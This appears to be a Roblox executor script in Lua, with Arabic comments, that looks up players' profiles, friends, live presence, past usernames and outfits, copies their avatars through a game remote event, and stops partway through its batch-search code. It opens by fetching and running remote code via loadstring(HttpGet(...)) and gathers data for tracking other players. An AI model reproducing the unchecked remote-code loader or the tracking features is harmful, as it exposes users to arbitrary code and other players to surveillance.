----------------------------------------------------------------
-- 1) تحميل Rayfield + إعداد الخدمات
----------------------------------------------------------------
local rayfieldOk, Rayfield = pcall(function()
    return loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
end)
if not rayfieldOk or not Rayfield then
    warn("تعذر تحميل مكتبة الواجهة Rayfield - تحقق من اتصالك بالإنترنت")
    return
end

local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
pcall(function() HttpService.HttpEnabled = true end)

-- حدث تطبيق السكن (يُبحث عنه بأمان حتى ما يوقف السكربت لو تغيّر مساره)
local ApplyMainAvatarEvent = ReplicatedStorage:FindFirstChild("ApplyMainAvatar")

----------------------------------------------------------------
-- 2) ألوان الثيم (أسود + أبيض + لامع)
----------------------------------------------------------------
local UI_BASE_BLACK = Color3.fromRGB(5, 5, 5)
local UI_CARD_BLACK = Color3.fromRGB(22, 22, 22)
local UI_WHITE      = Color3.fromRGB(255, 255, 255)
local UI_LIGHTGRAY  = Color3.fromRGB(190, 190, 190)

local function applyGlossyDark(instance, baseColor)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 60, 60)),
        ColorSequenceKeypoint.new(0.5, baseColor),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 30)),
    })
    gradient.Rotation = 90
    gradient.Parent = instance
    return gradient
end

-- بدون أي تأثير ليزر
local function addLaserScanEffect(panel)
    -- لا شيء
end

----------------------------------------------------------------
-- 2.5) تأثيرات فضية لامعة: إطار دوّار + نص لامع (بدون خلفية متحركة)
----------------------------------------------------------------
local function applySilverSpinBorder(frame, thickness, customColorSequence)
    local stroke = frame:FindFirstChildOfClass("UIStroke") or Instance.new("UIStroke")
    stroke.Thickness = thickness or 1.5
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.LineJoinMode = Enum.LineJoinMode.Round
    stroke.Color = UI_WHITE
    stroke.Parent = frame

    local gradient = stroke:FindFirstChildOfClass("UIGradient") or Instance.new("UIGradient")
    gradient.Color = customColorSequence or ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(90, 90, 90)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
    })
    gradient.Parent = stroke

    local rotationConnection
    rotationConnection = RunService.RenderStepped:Connect(function(delta)
        if not gradient or not gradient.Parent then
            rotationConnection:Disconnect()
            return
        end
        gradient.Rotation = (gradient.Rotation + (75 * delta)) % 360
    end)
end

local function applyGlossyContrastStyle(textLabel, customColorSequence)
    textLabel.TextColor3 = UI_WHITE
    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    textLabel.TextStrokeTransparency = 0.2

    local gradient = textLabel:FindFirstChildOfClass("UIGradient") or Instance.new("UIGradient", textLabel)
    gradient.Rotation = 0
    gradient.Color = customColorSequence or ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 150, 150)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(220, 220, 220)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(220, 220, 220)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 150, 150)),
    })

    local speed = 0.034
    local offset = -1.2
    local conn
    conn = RunService.RenderStepped:Connect(function()
        if not gradient.Parent then
            conn:Disconnect()
            return
        end
        offset = offset + speed
        if offset > 1.2 then offset = -1.2 end
        gradient.Offset = Vector2.new(offset, 0)
    end)
end

----------------------------------------------------------------
-- 3) أدوات عامة
----------------------------------------------------------------
local function copyToClipboard(text)
    local fn = setclipboard or toclipboard
    if not fn then return false end
    return pcall(fn, text)
end

local function safeDecode(body)
    if not body or body == "" then return false, nil end
    local ok, data = pcall(HttpService.JSONDecode, HttpService, body)
    if not ok or type(data) ~= "table" then return false, nil end
    return true, data
end

local function sendToast(title, text)
    pcall(function()
        StarterGui:SetCore("SendNotification", {Title = title, Text = text, Duration = 5})
    end)
end

----------------------------------------------------------------
-- 4) طبقة HttpService قوية (مهلة زمنية + تصاعد زمني + تمييز الأخطاء)
----------------------------------------------------------------
local MAX_ATTEMPTS = 4
local REQUEST_TIMEOUT = 10
local BASE_BACKOFF = 0.5

local function performRawRequest(options)
    if syn and syn.request then return syn.request(options)
    elseif fluxus and fluxus.request then return fluxus.request(options)
    elseif http and http.request then return http.request(options)
    elseif http_request then return http_request(options)
    elseif request then return request(options)
    else
        local res = HttpService:RequestAsync({
            Url = options.Url, Method = options.Method,
            Headers = options.Headers, Body = options.Body,
        })
        return {StatusCode = res.StatusCode, Body = res.Body}
    end
end

local function requestWithTimeout(options, timeoutSeconds)
    local completed = false
    local ok, result
    task.spawn(function()
        ok, result = pcall(performRawRequest, options)
        completed = true
    end)
    local elapsed, step = 0, 0.05
    while not completed and elapsed < timeoutSeconds do
        task.wait(step)
        elapsed += step
    end
    if not completed then return false, nil, "timeout" end
    if not ok then return false, nil, "exception" end
    return true, result, nil
end

local function httpRequest(options)
    local lastErrorMessage = "تعذر الاتصال بالخادم بعد عدة محاولات"
    for attempt = 1, MAX_ATTEMPTS do
        local success, result, failKind = requestWithTimeout(options, REQUEST_TIMEOUT)
        if success and result then
            local status = result.StatusCode
            if status and status >= 200 and status < 300 and result.Body then
                return true, result.Body
            elseif status == 429 then
                lastErrorMessage = "تم تجاوز الحد المسموح من الطلبات"
                task.wait(BASE_BACKOFF * (2 ^ (attempt - 1)) + math.random() * 0.3)
            elseif status and status >= 500 then
                lastErrorMessage = "الخادم لا يستجيب حالياً"
                task.wait(BASE_BACKOFF * attempt)
            elseif status and status >= 400 then
                return false, "طلب غير صالح (كود " .. tostring(status) .. ")"
            else
                lastErrorMessage = "استجابة غير متوقعة من الخادم"
                task.wait(BASE_BACKOFF * attempt)
            end
        elseif failKind == "timeout" then
            lastErrorMessage = "انتهت المهلة الزمنية للطلب، تحقق من اتصالك بالإنترنت"
            task.wait(BASE_BACKOFF * attempt)
        else
            lastErrorMessage = "تعذر الاتصال بالخادم"
            task.wait(BASE_BACKOFF * attempt)
        end
    end
    return false, lastErrorMessage
end

----------------------------------------------------------------
-- 5) الكاش
----------------------------------------------------------------
local CACHE_TTL = 60
local searchCache = {}

local function getCached(key)
    local entry = searchCache[key:lower()]
    if entry and (tick() - entry.time) < CACHE_TTL then return entry end
    return nil
end

local function setCached(key, data)
    data.time = tick()
    searchCache[key:lower()] = data
end

----------------------------------------------------------------
-- 6) المفضلة (محفوظة بملف محلي إذا المنفذ يدعم ذلك)
----------------------------------------------------------------
local FAVORITES_FILE = "player_lookup_favorites.json"
local favorites = {}

local function loadFavorites()
    if not (isfile and readfile) then return end
    local existsOk, exists = pcall(isfile, FAVORITES_FILE)
    if existsOk and exists then
        local readOk, raw = pcall(readfile, FAVORITES_FILE)
        if readOk then
            local decodeOk, data = safeDecode(raw)
            if decodeOk and type(data) == "table" then favorites = data end
        end
    end
end

local function saveFavorites()
    if not writefile then return end
    pcall(writefile, FAVORITES_FILE, HttpService:JSONEncode(favorites))
end

----------------------------------------------------------------
-- 7) دوال Roblox API
----------------------------------------------------------------
local function resolveUsername(username)
    local body = HttpService:JSONEncode({usernames = {username}, excludeBannedUsers = false})
    local ok, res = httpRequest({
        Url = "https://users.roblox.com/v1/usernames/users", Method = "POST",
        Headers = {["Content-Type"] = "application/json"}, Body = body,
    })
    if not ok then return nil, res end
    local decodeOk, data = safeDecode(res)
    if not decodeOk then return nil, "تعذر قراءة استجابة الخادم" end
    if not data.data or #data.data == 0 then return nil, "لم يتم العثور على هذا المستخدم" end
    local u = data.data[1]
    return {id = u.id, name = u.name, displayName = u.displayName}
end

local function getUserDetails(userId)
    local ok, res = httpRequest({Url = "https://users.roblox.com/v1/users/"..userId, Method = "GET"})
    if not ok then return nil end
    local decodeOk, data = safeDecode(res)
    if not decodeOk then return nil end
    return data
end

local function resolveUserInput(input)
    local trimmed = input:match("^%s*(.-)%s*$")
    local asId = trimmed:match("^%d+$")
    if asId then
        local details = getUserDetails(asId)
        if not details or not details.name then
            return nil, "لم يتم العثور على مستخدم بهذا المعرف"
        end
        return {id = tonumber(asId), name = details.name, displayName = details.displayName}
    end
    return resolveUsername(trimmed)
end

local function formatAccountAge(createdIso)
    local ok, dt = pcall(function() return DateTime.fromIsoDate(createdIso) end)
    if not ok or not dt then return "غير معروف" end
    local days = math.floor((DateTime.now().UnixTimestamp - dt.UnixTimestamp) / 86400)
    local years = math.floor(days / 365)
    if years >= 1 then
        return string.format("%d سنة تقريباً (%d يوم)", years, days)
    end
    return string.format("%d يوم", days)
end

local function getBadgeInfo(userId)
    local ok, res = httpRequest({Url = "https://badges.roblox.com/v1/users/"..userId.."/badges?limit=100&sortOrder=Asc", Method = "GET"})
    if not ok then return "غير متاح" end
    local decodeOk, data = safeDecode(res)
    if not decodeOk or not data.data then return "غير متاح" end
    local count = tostring(#data.data)
    if data.nextPageCursor then count = count .. "+" end
    return count
end

local function getFriends(userId)
    local ok, res = httpRequest({Url = "https://friends.roblox.com/v1/users/"..userId.."/friends", Method = "GET"})
    if not ok then return {}, res end
    local decodeOk, data = safeDecode(res)
    if not decodeOk or not data.data then return {}, "تعذر قراءة قائمة الأصدقاء" end
    return data.data, nil
end

local function getCount(userId, kind)
    local ok, res = httpRequest({Url = "https://friends.roblox.com/v1/users/"..userId.."/"..kind.."/count", Method = "GET"})
    if not ok then return "غير متاح" end
    local decodeOk, data = safeDecode(res)
    if not decodeOk or not data.count then return "غير متاح" end
    return tostring(data.count)
end

local function getPresence(userId)
    local body = HttpService:JSONEncode({userIds = {userId}})
    local ok, res = httpRequest({
        Url = "https://presence.roblox.com/v1/presence/users", Method = "POST",
        Headers = {["Content-Type"] = "application/json"}, Body = body,
    })
    if not ok then return nil end
    local decodeOk, data = safeDecode(res)
    if not decodeOk or not data.userPresences or not data.userPresences[1] then return nil end
    return data.userPresences[1]
end

local function formatPresence(presence)
    if not presence then return "غير معروف" end
    local presenceType = presence.userPresenceType
    if presenceType == 0 then
        return "غير متصل"
    elseif presenceType == 1 then
        return "متصل (خارج لعبة)"
    elseif presenceType == 2 then
        return "داخل لعبة: "..(presence.lastLocation or "غير معروف")
    elseif presenceType == 3 then
        return "داخل استوديو روبلوكس"
    end
    return "غير معروف"
end

local function getUsersBatch(ids)
    local map = {}
    local chunkSize = 90
    for start = 1, #ids, chunkSize do
        local chunk = {}
        for i = start, math.min(start + chunkSize - 1, #ids) do table.insert(chunk, ids[i]) end
        local body = HttpService:JSONEncode({userIds = chunk, excludeBannedUsers = false})
        local ok, res = httpRequest({
            Url = "https://users.roblox.com/v1/users", Method = "POST",
            Headers = {["Content-Type"] = "application/json"}, Body = body,
        })
        if ok then
            local decodeOk, data = safeDecode(res)
            if decodeOk and data.data then
                for _, u in ipairs(data.data) do
                    map[u.id] = {name = u.name, displayName = u.displayName}
                end
            end
        end
        if start + chunkSize <= #ids then task.wait(0.2) end
    end
    return map
end

-- حالة الأونلاين لكل الأصدقاء دفعة وحدة (تستخدم لترتيب القائمة: الأونلاين أول)
local function getPresenceBatch(ids)
    local map = {}
    if #ids == 0 then return map end
    local chunkSize = 50
    for start = 1, #ids, chunkSize do
        local chunk = {}
        for i = start, math.min(start + chunkSize - 1, #ids) do table.insert(chunk, ids[i]) end
        local body = HttpService:JSONEncode({userIds = chunk})
        local ok, res = httpRequest({
            Url = "https://presence.roblox.com/v1/presence/users", Method = "POST",
            Headers = {["Content-Type"] = "application/json"}, Body = body,
        })
        if ok then
            local decodeOk, data = safeDecode(res)
            if decodeOk and data.userPresences then
                for _, p in ipairs(data.userPresences) do
                    map[p.userId] = p
                end
            end
        end
        if start + chunkSize <= #ids then task.wait(0.2) end
    end
    return map
end

-- تاريخ الأسماء السابقة (Username History) - يفيد لمعرفة لو اللاعب غيّر يوزره قبل
local function getUsernameHistory(userId)
    local ok, res = httpRequest({
        Url = "https://users.roblox.com/v1/users/"..userId.."/username-history?limit=10&sortOrder=Desc",
        Method = "GET",
    })
    if not ok then return {} end
    local decodeOk, data = safeDecode(res)
    if not decodeOk or not data.data then return {} end
    local names = {}
    for _, entry in ipairs(data.data) do
        if entry.name then table.insert(names, entry.name) end
    end
    return names
end

-- الملابس/العناصر المرتداة حالياً (بديل قانوني عن "لبس السكن" اللي روبلوكس منعها من الكلاينت)
local function getCurrentlyWearing(userId)
    local ok, res = httpRequest({
        Url = "https://avatar.roblox.com/v1/users/"..userId.."/currently-wearing",
        Method = "GET",
    })
    if not ok then return {} end
    local decodeOk, data = safeDecode(res)
    if not decodeOk or not data.assetIds then return {} end
    return data.assetIds
end

----------------------------------------------------------------
-- 8) تصريحات مسبقة لعناصر الواجهة
----------------------------------------------------------------
local StatusLabel, NameLabel, UsernameLabel, IdLabel
local FollowersLabel, FollowingLabel, FriendsCountLabel
local AccountAgeLabel, VerifiedLabel, BadgesLabel, PresenceLabel
local PastUsernamesLabel, WearingCountLabel
local AvatarImage, FullBodyImage
local RecentDropdown, FavoritesDropdown
local FriendsScroll, FriendsLayout, FriendsPanel, FriendsTitle
local BatchStatusLabel, BatchResultsScroll, BatchResultsLayout, BatchResultsPanel, BatchResultsTitle

local usernameValue, batchInputValue = "", ""
local isSearching, isBatchSearching = false, false
local currentUser = nil
local recentSearches = {}
local MAX_RECENT = 8

-- حالة فلترة/ترتيب قائمة الأصدقاء + بيانات آخر تحميل لها
local lastFriendsRaw, lastFriendsUsersMap, lastFriendsPresenceMap = {}, {}, {}
local friendsFilterText = ""
local friendsSortOnlineFirst = false

-- تتبع تغييرات أصدقاء اللاعب المبحوث عنه (إضافة/حذف) بالخلفية
local friendsWatchEnabled = false
local FRIENDS_WATCH_INTERVAL = 25

-- (جديد) خاص بتبويب تطبيق السكن
local SkinApplyStatusLabel, SkinHistoryDropdown
local skinApplyInputValue = ""
local skinHistory = {}
local applySkinToSelf -- تُعرَّف فعليًا بالقسم 10.5، متاحة هنا مسبقاً عشان صفوف اللاعبين تقدر تستدعيها

----------------------------------------------------------------
-- 9) دوال مساعدة للـ GUI
----------------------------------------------------------------
local function updateScrollCanvas(scroll, layout)
    task.spawn(function()
        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
    end)
end

local function createScrollPanel(parentGui, titleText, size, position)
    local panel = Instance.new("Frame")
    panel.Size = size
    panel.Position = position
    panel.BackgroundColor3 = UI_BASE_BLACK
    panel.BorderSizePixel = 0
    panel.Parent = parentGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = panel

    local title = Instance.new("TextLabel")
    title.Name = "PanelTitle"
    title.Size = UDim2.new(1, 0, 0, 28)
    title.BackgroundTransparency = 1
    title.Text = titleText
    title.TextColor3 = UI_WHITE
    title.Font = Enum.Font.GothamBold
    title.TextSize = 14
    title.AutoLocalize = false
    title.ZIndex = 2
    title.Parent = panel

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -10, 1, -34)
    scroll.Position = UDim2.new(0, 5, 0, 30)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.ScrollBarImageColor3 = UI_WHITE
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.ZIndex = 2
    scroll.Parent = panel

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 6)
    layout.Parent = scroll

    return scroll, layout, panel, title
end

local function createPlayerRow(parent, layout, id, displayName, usernameText, copyValue, isFriendRow)
    -- صفوف الأصدقاء أصغر من صفوف البحث الجماعي
    local rowHeight = isFriendRow and 34 or 46
    local avatarSize = isFriendRow and 26 or 36
    local nameSize = isFriendRow and 11 or 13
    local userSize = isFriendRow and 9 or 12
    local btnW = isFriendRow and 26 or 34
    local btnH = isFriendRow and 22 or 28
    -- فيه زرّين الآن (نسخ + تطبيق) بدل زر وحد، فحجزنا مساحة أكبر للاسم واليوزر
    local reservedWidth = -(avatarSize + 8 + (btnW * 2 + 4) + 14)

    local entry = Instance.new("Frame")
    entry.Size = UDim2.new(1, 0, 0, rowHeight)
    entry.BackgroundColor3 = UI_CARD_BLACK
    entry.BorderSizePixel = 0
    entry.ZIndex = 2
    entry.Parent = parent

    local entryCorner = Instance.new("UICorner")
    entryCorner.CornerRadius = UDim.new(0, 8)
    entryCorner.Parent = entry

    local entryStroke = Instance.new("UIStroke")
    entryStroke.Color = UI_WHITE
    entryStroke.Thickness = 1
    entryStroke.Transparency = isFriendRow and 0.15 or 0.7
    entryStroke.Parent = entry

    applyGlossyDark(entry, UI_CARD_BLACK)

    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(0, avatarSize, 0, avatarSize)
    img.Position = UDim2.new(0, 4, 0.5, -avatarSize / 2)
    img.BackgroundTransparency = 1
    img.ZIndex = 3
    img.Image = "rbxthumb://type=AvatarHeadShot&id="..id.."&w=150&h=150"
    img.Parent = entry

    local imgCorner = Instance.new("UICorner")
    imgCorner.CornerRadius = UDim.new(0, avatarSize / 2)
    imgCorner.Parent = img

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1, reservedWidth, 0, isFriendRow and 14 or 20)
    nameLabel.Position = UDim2.new(0, avatarSize + 8, 0, isFriendRow and 1 or 2)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = displayName
    nameLabel.TextColor3 = UI_WHITE
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextSize = nameSize
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
    nameLabel.AutoLocalize = false
    nameLabel.ZIndex = 3
    nameLabel.Parent = entry

    local usernameLabel = Instance.new("TextLabel")
    usernameLabel.Size = UDim2.new(1, reservedWidth, 0, isFriendRow and 14 or 18)
    usernameLabel.Position = UDim2.new(0, avatarSize + 8, 0, isFriendRow and 16 or 22)
    usernameLabel.BackgroundTransparency = 1
    usernameLabel.Text = usernameText
    usernameLabel.TextColor3 = UI_LIGHTGRAY
    usernameLabel.Font = Enum.Font.Gotham
    usernameLabel.TextSize = userSize
    usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
    usernameLabel.TextTruncate = Enum.TextTruncate.AtEnd
    usernameLabel.AutoLocalize = false
    usernameLabel.ZIndex = 3
    usernameLabel.Parent = entry

    applyGlossyContrastStyle(nameLabel)
    applyGlossyContrastStyle(usernameLabel, ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 110, 110)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(210, 210, 210)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(110, 110, 110)),
    }))

    if isFriendRow then
        applySilverSpinBorder(entry, 1.5)
    end

    -- (جديد) زر تطبيق السكن - يسار زر النسخ
    local applyButton = Instance.new("TextButton")
    applyButton.Size = UDim2.new(0, btnW, 0, btnH)
    applyButton.Position = UDim2.new(1, -(btnW * 2 + 10), 0.5, -btnH / 2)
    applyButton.BackgroundColor3 = UI_WHITE
    applyButton.Text = isFriendRow and "سكن" or "تطبيق"
    applyButton.TextColor3 = Color3.fromRGB(10, 10, 10)
    applyButton.Font = Enum.Font.GothamBold
    applyButton.TextSize = isFriendRow and 9 or 10
    applyButton.AutoButtonColor = true
    applyButton.AutoLocalize = false
    applyButton.ZIndex = 3
    applyButton.Parent = entry

    local applyButtonCorner = Instance.new("UICorner")
    applyButtonCorner.CornerRadius = UDim.new(0, 8)
    applyButtonCorner.Parent = applyButton

    applySilverSpinBorder(applyButton, 1.2)

    applyButton.MouseButton1Click:Connect(function()
        -- copyValue هو نفس يوزر اللاعب المستخدم بزر النسخ
        if applySkinToSelf then
            applySkinToSelf(copyValue)
        end
        applyButton.Text = "تم"
        task.delay(1, function()
            applyButton.Text = isFriendRow and "سكن" or "تطبيق"
        end)
    end)

    local copyButton = Instance.new("TextButton")
    copyButton.Size = UDim2.new(0, btnW, 0, btnH)
    copyButton.Position = UDim2.new(1, -(btnW + 6), 0.5, -btnH / 2)
    copyButton.BackgroundColor3 = UI_WHITE
    copyButton.Text = "نسخ"
    copyButton.TextColor3 = Color3.fromRGB(10, 10, 10)
    copyButton.Font = Enum.Font.GothamBold
    copyButton.TextSize = isFriendRow and 9 or 10
    copyButton.AutoButtonColor = true
    copyButton.AutoLocalize = false
    copyButton.ZIndex = 3
    copyButton.Parent = entry

    local copyButtonCorner = Instance.new("UICorner")
    copyButtonCorner.CornerRadius = UDim.new(0, 8)
    copyButtonCorner.Parent = copyButton

    applySilverSpinBorder(copyButton, 1.2)

    copyButton.MouseButton1Click:Connect(function()
        local ok = copyToClipboard(copyValue)
        copyButton.Text = ok and "تم" or "خطأ"
        task.delay(1, function() copyButton.Text = "نسخ" end)
    end)

    updateScrollCanvas(parent, layout)
    return entry
end

local function addEmptyNotice(parent, layout, text)
    local notice = Instance.new("TextLabel")
    notice.Size = UDim2.new(1, 0, 0, 30)
    notice.BackgroundTransparency = 1
    notice.Text = text
    notice.TextColor3 = UI_LIGHTGRAY
    notice.Font = Enum.Font.Gotham
    notice.TextSize = 13
    notice.AutoLocalize = false
    notice.ZIndex = 2
    notice.Parent = parent
    updateScrollCanvas(parent, layout)
end

local function clearScroll(scroll)
    for _, child in ipairs(scroll:GetChildren()) do
        if child:IsA("Frame") or child:IsA("TextLabel") then child:Destroy() end
    end
end

local function renderFriendsList()
    clearScroll(FriendsScroll)

    local filterLower = friendsFilterText:lower()
    local filtered = {}
    for _, friend in ipairs(lastFriendsRaw) do
        local info = lastFriendsUsersMap[friend.id]
        local displayName = (info and info.displayName) or ""
        local username = (info and info.name) or ""
        if filterLower == "" or displayName:lower():find(filterLower, 1, true)
            or username:lower():find(filterLower, 1, true) then
            table.insert(filtered, friend)
        end
    end

    if friendsSortOnlineFirst then
        table.sort(filtered, function(a, b)
            local pa = lastFriendsPresenceMap[a.id]
            local pb = lastFriendsPresenceMap[b.id]
            local sa = pa and pa.userPresenceType or 0
            local sb = pb and pb.userPresenceType or 0
            return sa > sb
        end)
    end

    if #filtered == 0 then
        local emptyText = (#lastFriendsRaw == 0) and "لا يوجد أصدقاء أو القائمة خاصة" or "ما فيه نتائج تطابق الفلتر"
        addEmptyNotice(FriendsScroll, FriendsLayout, emptyText)
    else
        for _, friend in ipairs(filtered) do
            local info = lastFriendsUsersMap[friend.id]
            local displayName = (info and info.displayName) or "غير معروف"
            local username = (info and info.name) or "غير معروف"
            createPlayerRow(FriendsScroll, FriendsLayout, friend.id, displayName, "@"..username, username, true)
        end
    end
end

local function populateFriendsUI(friends, usersMap)
    lastFriendsRaw = friends
    lastFriendsUsersMap = usersMap

    local ids = {}
    for _, friend in ipairs(friends) do table.insert(ids, friend.id) end
    lastFriendsPresenceMap = getPresenceBatch(ids)

    renderFriendsList()
end

----------------------------------------------------------------
-- 10) المفضلة وآخر عمليات البحث
----------------------------------------------------------------
local function refreshRecentDropdown()
    local options = #recentSearches > 0 and recentSearches or {"لا يوجد بعد"}
    pcall(function() RecentDropdown:Refresh(options) end)
end

local function pushRecentSearch(username)
    for i = #recentSearches, 1, -1 do
        if recentSearches[i]:lower() == username:lower() then table.remove(recentSearches, i) end
    end
    table.insert(recentSearches, 1, username)
    while #recentSearches > MAX_RECENT do table.remove(recentSearches, #recentSearches) end
    refreshRecentDropdown()
end

local function refreshFavoritesDropdown()
    local options = #favorites > 0 and favorites or {"لا يوجد بعد"}
    pcall(function() FavoritesDropdown:Refresh(options) end)
end

----------------------------------------------------------------
-- 10.5) سجل تطبيق السكنات (Skin History) + تطبيق السكن فعليًا
----------------------------------------------------------------
local SKIN_HISTORY_FILE = "player_lookup_skin_history.json"

local function loadSkinHistory()
    if not (isfile and readfile) then return end
    local existsOk, exists = pcall(isfile, SKIN_HISTORY_FILE)
    if existsOk and exists then
        local readOk, raw = pcall(readfile, SKIN_HISTORY_FILE)
        if readOk then
            local decodeOk, data = safeDecode(raw)
            if decodeOk and type(data) == "table" then skinHistory = data end
        end
    end
end

local function saveSkinHistory()
    if not writefile then return end
    pcall(writefile, SKIN_HISTORY_FILE, HttpService:JSONEncode(skinHistory))
end

local function refreshSkinHistoryDropdown()
    local options = {}
    for _, entry in ipairs(skinHistory) do
        table.insert(options, entry.name.." (x"..tostring(entry.count)..")")
    end
    if #options == 0 then options = {"لا يوجد بعد"} end
    pcall(function() SkinHistoryDropdown:Refresh(options) end)
end

-- يسجل تطبيق سكن جديد: لو اليوزر موجود يزيد العداد فقط، ولو جديد يضيفه
-- السجل يبقى محفوظ دايمًا (ما يُمسح تلقائيًا) ومرتب من الأكثر استخدامًا للأقل
local function recordSkinApplication(username)
    local lowerName = username:lower()
    local found
    for _, entry in ipairs(skinHistory) do
        if entry.name:lower() == lowerName then
            found = entry
            break
        end
    end
    if found then
        found.count += 1
    else
        table.insert(skinHistory, {name = username, count = 1})
    end
    table.sort(skinHistory, function(a, b) return a.count > b.count end)
    saveSkinHistory()
    refreshSkinHistoryDropdown()
end

-- تطبيق سكن لاعب على نفسي فورًا وبدون أي تأخير أو انتظار
applySkinToSelf = function(username)
    username = username and username:match("^%s*(.-)%s*$") or ""
    if username == "" then
        if SkinApplyStatusLabel then SkinApplyStatusLabel:Set("اكتب يوزر أولاً") end
        return
    end

    if not ApplyMainAvatarEvent then
        ApplyMainAvatarEvent = ReplicatedStorage:FindFirstChild("ApplyMainAvatar")
    end
    if not ApplyMainAvatarEvent then
        if SkinApplyStatusLabel then
            SkinApplyStatusLabel:Set("لم يتم العثور على حدث ApplyMainAvatar - تحقق من اللعبة")
        end
        return
    end

    local ok, err = pcall(function()
        ApplyMainAvatarEvent:FireServer(username)
    end)

    if ok then
        if SkinApplyStatusLabel then
            SkinApplyStatusLabel:Set("تم تطبيق سكن: "..username)
        end
        sendToast("تطبيق السكن", "تم إرسال طلب تطبيق سكن "..username)
        recordSkinApplication(username)
    else
        if SkinApplyStatusLabel then
            SkinApplyStatusLabel:Set("فشل تطبيق السكن: "..tostring(err))
        end
    end
end

----------------------------------------------------------------
-- 11) تطبيق نتيجة بحث على الواجهة + دالة البحث الرئيسية
----------------------------------------------------------------
local function applySearchResult(data)
    local user = data.user
    currentUser = {
        id = user.id, name = user.name, displayName = user.displayName,
        accountAge = data.accountAge, verified = data.verified, badgeCount = data.badgeCount,
        followers = data.followers, following = data.following,
        friendsCount = #data.friends, presenceText = formatPresence(data.presence),
        wearingAssetIds = data.wearingAssetIds,
    }

    AvatarImage.Image = "rbxthumb://type=AvatarHeadShot&id="..user.id.."&w=420&h=420"
    FullBodyImage.Image = "rbxthumb://type=Avatar&id="..user.id.."&w=420&h=420"
    NameLabel:Set("الاسم الظاهر: "..user.displayName)
    UsernameLabel:Set("اسم المستخدم: @"..user.name)
    IdLabel:Set("المعرف: "..tostring(user.id))
    FollowersLabel:Set("المتابعون: "..data.followers)
    FollowingLabel:Set("يتابع: "..data.following)
    FriendsCountLabel:Set("عدد الأصدقاء: "..tostring(#data.friends))
    AccountAgeLabel:Set("عمر الحساب: "..(data.accountAge or "غير متاح"))
    VerifiedLabel:Set("موثق: "..(data.verified and "نعم ✔️" or "لا"))
    BadgesLabel:Set("عدد الشارات: "..(data.badgeCount or "غير متاح"))
    PresenceLabel:Set("الحالة الآن: "..currentUser.presenceText)

    local pastNames = data.pastUsernames or {}
    PastUsernamesLabel:Set(#pastNames > 0 and ("أسماء سابقة: "..table.concat(pastNames, ", ")) or "أسماء سابقة: لا يوجد")
    WearingCountLabel:Set("عدد الملابس الحالية: "..tostring(#(data.wearingAssetIds or {})))

    populateFriendsUI(data.friends, data.usersMap)
end

local function performSearch()
    if isSearching then return end
    if usernameValue == "" then
        StatusLabel:Set("اكتب يوزر أو ID أولاً")
        return
    end

    isSearching = true
    StatusLabel:Set("جاري البحث...")

    local cached = getCached(usernameValue)
    if cached then
        applySearchResult(cached)
        StatusLabel:Set("تم الجلب من الذاكرة المؤقتة")
        isSearching = false
        return
    end

    local user, err = resolveUserInput(usernameValue)
    if not user then
        StatusLabel:Set(err or "حدث خطأ")
        isSearching = false
        return
    end

    local details = getUserDetails(user.id)
    local accountAge = (details and details.created) and formatAccountAge(details.created) or "غير متاح"
    local verified = details and details.hasVerifiedBadge or false

    local followers = getCount(user.id, "followers")
    local following = getCount(user.id, "followings")
    local badgeCount = getBadgeInfo(user.id)
    local presence = getPresence(user.id)
    local friends, friendsErr = getFriends(user.id)
    local pastUsernames = getUsernameHistory(user.id)
    local wearingAssetIds = getCurrentlyWearing(user.id)

    local ids = {}
    for _, friend in ipairs(friends) do table.insert(ids, friend.id) end
    local usersMap = getUsersBatch(ids)

    local result = {
        user = user, followers = followers, following = following,
        friends = friends, usersMap = usersMap, accountAge = accountAge,
        verified = verified, badgeCount = badgeCount, presence = presence,
        pastUsernames = pastUsernames, wearingAssetIds = wearingAssetIds,
    }

    setCached(usernameValue, result)
    applySearchResult(result)
    pushRecentSearch(user.name)
    sendToast("بحث اللاعبين", "تم العثور على "..user.displayName)

    StatusLabel:Set(friendsErr and ("تم البحث، بس صار خطأ بقائمة الأصدقاء: "..friendsErr) or "تم البحث بنجاح")
    isSearching = false
end

----------------------------------------------------------------
-- 12) بحث جماعي
----------------------------------------------------------------
local function runBatchSearch()
    if isBatchSearching then return end
    if batchInputValue == "" then
        BatchStatusLabel:Set("اكتب يوزرات أولاً (افصل بفاصلة)")
        return
    end

    isBatchSearching = true
    clearScroll(BatchResultsScroll)

    local usernames = {}
